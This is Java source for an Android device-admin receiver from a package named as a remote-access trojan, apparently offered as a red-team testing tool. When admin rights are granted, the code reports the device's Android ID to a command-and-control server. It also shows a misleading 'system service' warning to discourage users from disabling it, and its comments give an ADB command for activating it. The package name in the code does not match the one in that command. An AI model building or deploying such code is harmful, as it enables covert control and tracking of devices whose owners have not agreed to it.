package com.company.rat;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * Device Admin Receiver — allows the app to be activated as a Device Admin.
 *
 * When activated, the app gains elevated privileges:
 *   - Can lock the screen, enforce password policy
 *   - On Android 9+ (if device owner): can silently enable accessibility services
 *     and grant permissions without user prompts
 *
 * Red team testing:
 *   Activate via ADB: adb shell dpm set-active-admin com.company.auditagent/.DeviceAdminReceiver
 *   The company MDM should BLOCK this and alert — if it doesn't, that's a finding.
 *
 * Blue team: MDM policies should prevent unknown apps from becoming device admins.
 */
public class DeviceAdminReceiver extends android.app.admin.DeviceAdminReceiver {

    private static final String TAG = "DeviceAdmin";

    @Override
    public void onEnabled(Context ctx, Intent intent) {
        Log.i(TAG, "Device admin ENABLED — elevated privileges active");
        // Report back to C2 that device admin was granted
        new Thread(() -> {
            C2Client c2 = C2Client.fromAssets(ctx);
            String id  = android.provider.Settings.Secure.getString(
                    ctx.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
            c2.sendResult("android_" + id, "DEVICE_ADMIN_GRANTED — MDM did not block device admin activation");
        }).start();
    }

    @Override
    public void onDisabled(Context ctx, Intent intent) {
        Log.i(TAG, "Device admin DISABLED");
    }

    @Override
    public CharSequence onDisableRequested(Context ctx, Intent intent) {
        return "Disabling will remove system service functionality.";
    }
}
